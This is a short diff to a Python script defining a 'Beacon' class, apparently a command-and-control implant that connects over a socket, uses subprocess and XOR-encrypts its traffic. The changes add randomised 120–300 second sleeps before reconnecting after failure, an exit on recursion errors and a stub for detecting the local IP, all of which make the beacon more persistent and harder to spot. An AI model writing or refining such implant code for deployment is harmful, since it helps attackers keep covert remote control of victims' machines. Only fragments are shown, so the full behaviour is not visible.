@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import socket,subprocess,time
+import socket,subprocess,time,random
 from Crypto.Util.strxor import strxor
 
 class Beacon:
@@ -117,7 +117,11 @@ class Beacon:
                except socket.timeout:
                   continue
       except:
-         self.start()
+         try:
+            time.sleep(random.randint(120,300))
+            self.start()
+         except RecursionError:
+            quit()
             
    def terminate(self):
       self.running = False
@@ -131,6 +135,9 @@ class Beacon:
    def decrypt(self,data):
       key = self.key * (len(data) // len(self.key)) + self.key[:len(data) % len(self.key)]
       return strxor(data,key.encode())
+   
+   def detect_local_ip(self):
+      pass
 
 def main():
    beacon = Beacon("127.0.0.1",10267)
